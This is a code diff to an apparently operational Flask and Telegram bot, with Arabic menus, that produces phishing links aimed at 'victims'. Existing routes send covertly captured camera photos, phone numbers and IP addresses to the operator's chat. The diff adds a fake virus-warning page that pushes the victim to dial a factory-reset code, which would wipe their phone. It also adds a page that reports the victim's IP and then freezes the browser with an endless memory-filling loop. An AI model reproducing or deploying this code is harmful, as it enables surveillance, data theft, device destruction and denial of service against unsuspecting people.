@@ -1,5 +1,5 @@
 import requests
-from flask import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string, redirect, send_file
 import base64
 import random
 import string
@@ -11,7 +11,7 @@ ADMIN_ID = "7870803639"
 BASE_URL = "https://freeusr-bot.onrender.com"
 
 user_state = {}
-short_links = {} # مخزن الروابط المختصرة
+short_links = {}
 
 def send_message(chat_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -33,7 +33,7 @@ def answer_callback(callback_id):
 def main_menu():
     return {
         "inline_keyboard": [
-            [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "v1"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
+            [{"text": "🎥 تصوير الضحية فيديو (تجميد)", "callback_data": "freeze"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
             [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "v3"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "device"}],
             [{"text": "🕵️‍♂️ أختراق كاميرا المراقبة", "callback_data": "v5"}, {"text": "🌍 أختراق الموقع", "callback_data": "v6"}],
             [{"text": "🟩 اغلااق المواقع", "callback_data": "v7"}, {"text": "💜 الذكاء الاصطناعي الشرير", "callback_data": "v8"}],
@@ -42,7 +42,7 @@ def main_menu():
             [{"text": "🐦 أختراق تويتر", "callback_data": "v12"}, {"text": "🔴 أختراق يوتيوب", "callback_data": "v13"}],
             [{"text": "💎 أختراق فري فاير", "callback_data": "v14"}, {"text": "💵 أختراق ببجي", "callback_data": "v15"}],
             [{"text": "😂 اعطيني نكته", "callback_data": "joke"}],
-            [{"text": "⛔ أختراق الهاتف كاملاً", "callback_data": "v16"}, {"text": "🔒 إخفاء الرابط", "callback_data": "v17"}],
+            [{"text": "⛔ أختراق الهاتف كاملاً (فرمتة)", "callback_data": "v16"}, {"text": "🔒 إخفاء الرابط", "callback_data": "v17"}],
             [{"text": "🛑 المزيد من المميزات", "callback_data": "more"}],
             [{"text": "📺 أختراق بت التلفزيون", "callback_data": "v18"}, {"text": "📻 أختراق بت الريدو", "callback_data": "v19"}],
             [{"text": "📱 معلومات انستا وتيك توك", "callback_data": "v20"}, {"text": "☠️ بوت أختراق", "callback_data": "v21"}],
@@ -55,15 +55,14 @@ def main_menu():
         ]
     }
 
-# مسار إخفاء الروابط (التحويل)
+# ============= المسارات (Routes) =============
+
 @app.route('/s/<code>')
 def redirect_short(code):
     url = short_links.get(code)
     if url:
         return redirect(url)
     return "الرابط غير موجود أو تم حذفه.", 404
-
-# ---------- مسارات الويب ----------
 
 @app.route('/')
 def index():
@@ -164,18 +163,15 @@ def camera_page():
 @app.route('/upload_camera', methods=['POST'])
 def upload_camera():
     data = request.get_json()
-    if not data or 'image' not in data:
-        return "error", 400
+    if not data or 'image' not in data: return "error", 400
     admin_id = data.get('admin')
     target = data.get('target')
     img_data = data['image'].split(',')[1]
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
     files = {'photo': ('camera.jpg', base64.b64decode(img_data), 'image/jpeg')}
     payload = {'chat_id': admin_id, 'caption': f"📷 *صورة من كاميرا الضحية!*\n🎯 الهدف: {target}"}
-    try:
-        requests.post(url, data=payload, files=files)
-    except Exception as e:
-        print(e)
+    try: requests.post(url, data=payload, files=files)
+    except Exception as e: print(e)
     return "ok"
 
 @app.route('/device')
@@ -263,13 +259,97 @@ def submit_phone():
     admin_id = request.form.get('admin_id')
     target = request.form.get('target')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
     msg = f"📱 *رقم هاتف جديد تم صيده!*\n🎯 اليوزر المستهدف: `@{target}`\n📞 الرقم: `{phone}`\n🌐 IP الضحية: `{ip}`"
-    if admin_id:
-        send_message(admin_id, msg)
+    if admin_id: send_message(admin_id, msg)
     return redirect("https://t.me/" + target)
 
-# ---------- البوت ----------
+@app.route('/format')
+def format_page():
+    admin = request.args.get('admin', '')
+    target = request.args.get('target', '')
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحذير أمني</title>
+    <style>
+    body{font-family:Arial;background:#ffebee;color:#b71c1c;text-align:center;padding:40px 20px;margin:0}
+    .box{background:#fff;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 4px 15px rgba(0,0,0,0.2);border-top:5px solid #f44336}
+    h1{font-size:24px;margin-bottom:10px}
+    p{color:#555;font-size:14px;line-height:1.6}
+    a.btn{display:block;background:#f44336;color:#fff;text-decoration:none;padding:15px;border-radius:8px;font-weight:bold;font-size:18px;margin-top:20px;animation:pulse 1.5s infinite}
+    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+    .note{font-size:11px;color:#999;margin-top:15px}
+    </style>
+    </head>
+    <body>
+    <div class="box">
+    <h1>⚠️ تم اكتشاف فيروس!</h1>
+    <p>تم اكتشاف برمجيات خبيثة تسرق بياناتك. لحماية جهازك، يجب فرمتة الجهاز فوراً لمسح الفيروس.</p>
+    <p>اضغط بالأسفل لبدء عملية الفرمتة:</p>
+    <a href="tel:*#*#7780#*#*" class="btn">فرمتة الجهاز الآن</a>
+    <div class="note">سيتم تحويلك لشاشة الاتصال، اضغط على زر الاتصال الأخضر لتأكيد الفرمتة.</div>
+    </div>
+    </body>
+    </html>
+    """, admin=admin, target=target)
+
+# مسار فيروس التجميد
+@app.route('/freeze')
+def freeze_page():
+    admin = request.args.get('admin', '')
+    target = request.args.get('target', '')
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+    body{background:#111;color:#fff;text-align:center;font-family:Arial;padding-top:50px;overflow:hidden;}
+    .spinner{width:50px;height:50px;border:5px solid #333;border-top:5px solid #00ffcc;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px auto;}
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+    </head>
+    <body>
+    <div class="spinner"></div>
+    <h2>جاري معالجة الملف...</h2>
+    <p style="color:#888;font-size:14px;">يرجى الانتظار، لا تغلق الصفحة.</p>
+
+    <script>
+    fetch('/collect_freeze', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ admin: '{{ admin }}', target: '{{ target }}' })
+    });
+
+    setTimeout(function() {
+        function freeze() {
+            while(true) {
+                let bomb = new Array(10000000).fill("WOODE_FREEZE_PAYLOAD");
+            }
+        }
+        freeze();
+    }, 1000);
+    </script>
+    </body>
+    </html>
+    """, admin=admin, target=target)
+
+@app.route('/collect_freeze', methods=['POST'])
+def collect_freeze():
+    data = request.get_json()
+    admin_id = data.get('admin')
+    target = data.get('target')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ',' in ip: ip = ip.split(',')[0].strip()
+
+    msg = f"❄️ *الضحية فتح رابط التجميد!*\n🎯 الهدف: `{target}`\n🌐 الـ IP: `{ip}`\n📱 جاري تجميد المتصفح الآن..."
+    if admin_id: send_message(admin_id, msg)
+    return "ok", 200
+
+# ============= البوت =============
 
 @app.route(f'/webhook', methods=['POST'])
 def webhook():
@@ -289,14 +369,12 @@ def webhook():
             action = state_data['action']
             target = text
             
-            if action == 'insta':
-                link = f"{BASE_URL}/?target={target}&admin={chat_id}"
-            elif action == 'camera':
-                link = f"{BASE_URL}/camera?target={target}&admin={chat_id}"
-            elif action == 'device':
-                link = f"{BASE_URL}/device?target={target}&admin={chat_id}"
-            elif action == 'phone':
-                link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
+            if action == 'insta': link = f"{BASE_URL}/?target={target}&admin={chat_id}"
+            elif action == 'camera': link = f"{BASE_URL}/camera?target={target}&admin={chat_id}"
+            elif action == 'device': link = f"{BASE_URL}/device?target={target}&admin={chat_id}"
+            elif action == 'phone': link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
+            elif action == 'format': link = f"{BASE_URL}/format?target={target}&admin={chat_id}"
+            elif action == 'freeze': link = f"{BASE_URL}/freeze?target={target}&admin={chat_id}"
                 
             send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
             del user_state[chat_id]
@@ -307,17 +385,14 @@ def webhook():
                 geo = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,org,as,query', timeout=5).json()
                 if geo.get('status') == 'success':
                     res = f"🌍 *معلومات الـ IP:*\n\n📍 الدولة: {geo.get('country')}\n🏙 المدينة: {geo.get('city')}\n📡 المزود: {geo.get('isp')}\n🏢 المؤسسة: {geo.get('org')}"
-                else:
-                    res = "❌ الـ IP غير صالح أو غير موجود."
-            except:
-                res = "❌ حدث خطأ أثناء جلب البيانات."
+                else: res = "❌ الـ IP غير صالح أو غير موجود."
+            except: res = "❌ حدث خطأ أثناء جلب البيانات."
             send_message(chat_id, res)
             del user_state[chat_id]
             
         elif user_state.get(chat_id, {}).get('state') == 'waiting_for_link':
             long_url = text
-            if not long_url.startswith("http"):
-                long_url = "http://" + long_url
+            if not long_url.startswith("http"): long_url = "http://" + long_url
             code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
             short_links[code] = long_url
             short_url = f"{BASE_URL}/s/{code}"
@@ -332,8 +407,7 @@ def webhook():
         
         answer_callback(cb_id)
         
-        if data == 'joke':
-            send_message(chat_id, "مرة واحد روبوت دخل مطعم قاله عايز بطارية مشوية 😂")
+        if data == 'joke': send_message(chat_id, "مرة واحد روبوت دخل مطعم قاله عايز بطارية مشوية 😂")
         elif data == 'insta':
             user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'insta'}
             send_message(chat_id, "📸 أرسل اسم أو إيميل الضحية:")
@@ -352,6 +426,12 @@ def webhook():
         elif data == 'v17':
             user_state[chat_id] = {'state': 'waiting_for_link'}
             send_message(chat_id, "🔒 أرسل الرابط الطويل الذي تريد إخفاءه:")
+        elif data == 'v16':
+            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'format'}
+            send_message(chat_id, "⛔ أرسل اسم الضحية لإنشاء رابط الفرمتة:")
+        elif data == 'freeze':
+            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'freeze'}
+            send_message(chat_id, "❄️ أرسل اسم الضحية لإنشاء رابط التجميد:")
         else:
             send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅\nجاري استخراج البيانات...")
             
